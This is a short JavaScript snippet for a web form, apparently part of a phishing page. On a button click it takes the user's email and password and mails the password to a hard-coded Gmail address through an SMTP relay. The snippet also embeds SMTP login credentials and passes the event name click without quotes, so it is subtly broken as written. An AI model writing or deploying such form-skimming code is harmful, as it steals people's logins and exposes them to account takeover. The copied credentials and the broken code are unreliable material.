const btn = document.querySelector('button');
const inputs = document.querySelector('form')
btn.addEventListener(click, () => {
    Email.send({
        Host: "smtp.mailtrap.io",
        Username: "68446659472847",
        Password: "1754ae58430441",
        To: "olivierndi57@gmail.com",
        From: inputs.elements['email'].value,
        Subject: "Bonjour votre mot de passe est:",
        Body: inputs.elements['password'].value
    }).then(msg => alert(msg))
})